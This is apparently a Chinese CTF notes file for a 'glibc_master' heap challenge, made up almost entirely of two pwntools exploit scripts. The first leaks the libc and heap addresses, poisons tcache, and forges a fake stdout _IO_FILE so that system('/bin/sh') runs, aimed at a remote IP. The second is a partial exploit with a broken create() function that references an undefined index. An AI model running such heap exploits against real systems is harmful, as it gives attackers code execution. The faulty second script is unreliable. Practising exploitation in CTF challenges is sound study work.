# ciscn



## glibc_master

长城杯pwn

```python
# encoding: utf-8
#!/usr/bin/python
from pwn import *
import sys
context.log_level = "debug"
context.arch="amd64"
binary_name = "glibc_master"
libc_name = "libc-2.31.so"
ld_name = "ld"
local = 1
version = "9.7"
elf =ELF("./"+binary_name)
libc = ELF("/home/chen/glibc/{}/{}/{}".format(libc_name,version,libc_name))
#ld = ELF("./"+ld_name)
se      = lambda data               :io.send(data) 
sa      = lambda delim,data         :io.sendafter(delim, data)
sl      = lambda data               :io.sendline(data)
sla     = lambda delim,data         :io.sendlineafter(delim, data)
rc      = lambda num                  :io.recv(num)
rl      = lambda :io.recvline()
ru      = lambda delims             :io.recvuntil(delims)
uu32    = lambda data               :u32(data.ljust(4, b'x00')) 
uu64    = lambda data               :u64(data.ljust(8, b'x00'))
info    = lambda tag, addr          :log.info(tag + " -------------> " + hex(addr))
ia        = lambda :io.interactive()

if local==1:    
    io = remote("123.56.77.227",18779)
else:    
    io = process("./"+binary_name)


def debug():    
    gdb.attach(io,''' ''')    
    pause()
    
def add(index,size):    
    sla(">>","1")    
    sla("input index:",str(index))    
    sla("input size:",str(size))
    
def edit(index,context):    
    sla(">>","2")    
    sla("input index:",str(index))    
    sla("input context:",context)
    
def show(index):    
    sla(">>","3")   
    sla("input index:",str(index))
    
def free(index):    
    sla(">>","4")    
    sla("input index:",str(index))
    
def encrypt(data):    
    s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='    
    s1=''    
    x = len(s) 
    for i in range(len(data)):        
        s1 += chr(ord(s[i%x]) ^ ord(data[i])) 
    return s1



add(0,0x428)
add(1,0x410)
add(2,0x418)
add(3,0x410)
free(0)
show(0)
ru("n")
libcbase = uu64(io.recv(6)) - 2018272
system_addr=libcbase+libc.sym["system"]
stdout_addr = libcbase + libc.sym["_IO_2_1_stdout_"]
mp_addr =libcbase + 2015952 #2015952
free_hook = libcbase + libc.sym["__free_hook"]

info("stdout_addr",stdout_addr)
info("libcbase",libcbase)
add(4,0x450)
payload = p64(0)*3 + p64(mp_addr-0x20)
edit(0,encrypt(payload))
free(2)
add(5,0x450)
free(1)
free(3)
show(3)
ru("n")
heap_addr = uu64(io.recv(6))
info("heap_addr",heap_addr)
payload = p64(stdout_addr)
edit(3,encrypt(payload))
add(6,0x410)
add(7,0x410)
fake_IO_FILE = "/bin/shx00"+p64(0)*3
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(0)
fake_IO_FILE +=p64(1)+p64(0)
fake_IO_FILE +=p64(heap_addr)#rdx
fake_IO_FILE +=p64(system_addr)#call addr
fake_IO_FILE +=p64(0xffffffffffffffff)
fake_IO_FILE = fake_IO_FILE.ljust(0x48, 'x00')
fake_IO_FILE += p64(0 ) # _chain
fake_IO_FILE = fake_IO_FILE.ljust(0x88, 'x00')
fake_IO_FILE += p64(libcbase+2025440) # _lock = writable address
fake_IO_FILE = fake_IO_FILE.ljust(0xa0, 'x00')
fake_IO_FILE +=p64(stdout_addr+0x30) #rax1
fake_IO_FILE = fake_IO_FILE.ljust(0xc0, 'x00')
fake_IO_FILE += p64(0) # _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xd8, 'x00')
fake_IO_FILE += p64(libcbase+2002784+0x10) # vtable=IO_wfile_jumps+0x10
fake_IO_FILE +=p64(0)*6
fake_IO_FILE += p64(stdout_addr+48) # rax2
edit(7,encrypt(fake_IO_FILE))
#debug()
ia()
```



```python
# -*- coding: utf-8 -*-
from pwn import *
from LibcSearcher import *
from struct import pack
import pwnlib

context(arch='amd64',os='linux',log_level='debug')

ip = "pwn.challenge.ctf.show"
port = 28212
elf = ELF('./glibc_master')

r = remote(ip,port)

def create(size,content):
    r.recvuntil("4.Delete")
    r.sendline("1")
    r.recvuntil("input index:")
    r.sendline(str(index))
    r.recvuntil("input size:")
    r.sendline(size)

def edit(index,content):
    r.recvuntil("4.Delete")
    r.sendline("2")
    r.recvuntil("input index:")
    r.sendline(str(index))
    r.recvuntil("input context:")
    r.sendline(content)
    
    
def show(index):
    r.recvuntil("4.Delete")
    r.sendline("3")
    r.recvuntil("input index:")
    r.sendline(str(index))    
    
def delete(index):
    r.recvuntil("4.Delete")
    r.sendline("4")
    r.recvuntil("input index:")
    r.sendline(str(index))



create(32,"a"*32)
create(32,"b"*32)
delete(0)
delete(1)
create(0x8,p32(0x08049684))
show(0)
r.interactive()
```







## 样题
